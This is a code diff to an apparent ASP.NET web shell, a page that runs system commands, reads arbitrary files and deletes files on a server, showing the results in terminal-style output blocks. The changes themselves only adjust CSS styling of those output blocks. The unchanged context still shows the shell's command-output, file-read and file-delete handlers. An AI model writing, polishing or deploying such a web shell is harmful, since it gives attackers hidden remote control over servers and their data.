@@ -45,15 +45,15 @@
                     string output = process.StandardOutput.ReadToEnd();
                     string error = process.StandardError.ReadToEnd();
 
-                    Response.Write("<pre style='background-color: #000; color: #0f0; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; margin-bottom: 20px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word; max-height: none;'>" + Server.HtmlEncode(output) + "</pre>");
+                    Response.Write("<pre style='background-color: #000; color: #0f0; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word; max-height: none; height: auto;'>" + Server.HtmlEncode(output) + "</pre>");
                     if (!string.IsNullOrEmpty(error))
                     {
-                        Response.Write("<pre style='background-color: #000; color: #f00; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; margin-bottom: 20px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word; max-height: none;'>" + Server.HtmlEncode(error) + "</pre>");
+                        Response.Write("<pre style='background-color: #000; color: #f00; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word; max-height: none; height: auto;'>" + Server.HtmlEncode(error) + "</pre>");
                     }
                 }
                 catch (Exception ex)
                 {
-                    Response.Write("<pre style='color:red; background-color: #000; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; max-height: none;'>Error: " + Server.HtmlEncode(ex.Message) + "</pre>");
+                    Response.Write("<pre style='color:red; background-color: #000; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; max-height: none; height: auto;'>Error: " + Server.HtmlEncode(ex.Message) + "</pre>");
                 }
             }
 
@@ -67,7 +67,7 @@
                         if (File.Exists(filePathCommand))
                         {
                             string fileContent = File.ReadAllText(filePathCommand);
-                            Response.Write("<pre style='background-color: #000; color: #0f0; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; margin-bottom: 20px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word; max-height: none;'>" + Server.HtmlEncode(fileContent) + "</pre>");
+                            Response.Write("<pre style='background-color: #000; color: #0f0; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word; max-height: none; height: auto;'>" + Server.HtmlEncode(fileContent) + "</pre>");
                         }
                         else
                         {
@@ -76,7 +76,7 @@
                     }
                     catch (Exception ex)
                     {
-                        Response.Write("<pre style='color:red; background-color: #000; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; max-height: none;'>Error: " + Server.HtmlEncode(ex.Message) + "</pre>");
+                        Response.Write("<pre style='color:red; background-color: #000; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; max-height: none; height: auto;'>Error: " + Server.HtmlEncode(ex.Message) + "</pre>");
                     }
                 }
                 else if (action == "Delete File")
@@ -95,7 +95,7 @@
                     }
                     catch (Exception ex)
                     {
-                        Response.Write("<pre style='color:red; background-color: #000; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; max-height: none;'>Error: " + Server.HtmlEncode(ex.Message) + "</pre>");
+                        Response.Write("<pre style='color:red; background-color: #000; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; max-height: none; height: auto;'>Error: " + Server.HtmlEncode(ex.Message) + "</pre>");
                     }
                 }
             }
